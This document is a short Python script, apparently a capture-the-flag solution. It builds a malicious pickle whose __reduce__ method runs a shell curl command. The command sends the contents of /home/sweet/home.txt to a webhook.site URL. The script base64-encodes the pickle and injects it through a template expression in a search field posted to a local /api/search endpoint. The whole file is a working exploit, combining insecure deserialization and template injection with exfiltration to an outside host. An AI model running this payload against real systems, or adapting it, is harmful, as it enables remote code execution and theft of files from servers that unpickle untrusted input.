import requests
import pickle
import base64
import os

# REMEMBER: ALSO CHANGE WEBHOOK.SITE BELOW
hostname = 'http://localhost:8000'
# FLAG IS IN WEBHOOK.SITE AFTER EXPLOIT

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl -d \"`cat /home/sweet/home.txt`\" https://webhook.site/128edaef-13f9-4180-8e3d-7230657b8cfc",))

payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(payload).decode() 

keyword = "abcd {{return_method(\"" + encoded_payload + "\")}}"
r = requests.post(hostname + '/api/search', json={"searchKeyword": keyword})
print(r.text)